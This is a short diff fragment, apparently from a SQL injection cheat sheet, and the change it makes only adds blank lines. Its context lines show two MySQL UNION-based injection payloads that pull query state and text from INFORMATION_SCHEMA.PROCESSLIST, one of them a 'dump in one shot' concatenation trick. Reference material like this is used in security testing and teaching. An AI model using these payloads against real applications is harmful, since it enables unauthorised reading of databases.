@@ -17,3 +17,5 @@ union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
 -- Dump in one shot example for the table content.
 union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
 ```
+
+
